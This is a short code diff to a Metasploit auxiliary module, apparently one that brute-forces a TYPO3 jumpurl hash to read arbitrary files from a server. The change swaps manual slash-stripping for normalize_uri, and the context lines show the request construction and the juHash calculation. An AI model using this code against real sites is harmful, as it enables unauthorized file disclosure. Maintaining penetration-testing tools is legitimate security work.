@@ -63,6 +63,7 @@ class Metasploit4 < Msf::Auxiliary
 	# Null byte fixed in PHP 5.3.4
 	#
 
+    uri = normalize_uri(datastore['URI'])
 	case datastore['RFILE']
 	when nil
 		# Nothing
@@ -95,8 +96,7 @@ class Metasploit4 < Msf::Auxiliary
 		juhash = Digest::MD5.hexdigest(juarray)
 		juhash = juhash[0..9] # shortMD5 value for use as juhash
 
-		file_uri = "#{datastore['URI']}/index.php?jumpurl=#{jumpurl}&juSecure=1&locationData=#{locationData}&juHash=#{juhash}"
-		file_uri = file_uri.sub("//", "/") # Prevent double // from appearing in uri
+		file_uri = "#{uri}/index.php?jumpurl=#{jumpurl}&juSecure=1&locationData=#{locationData}&juHash=#{juhash}"
 		vprint_status("Checking Encryption Key [#{i}/1000]: #{final}")
 
 		begin
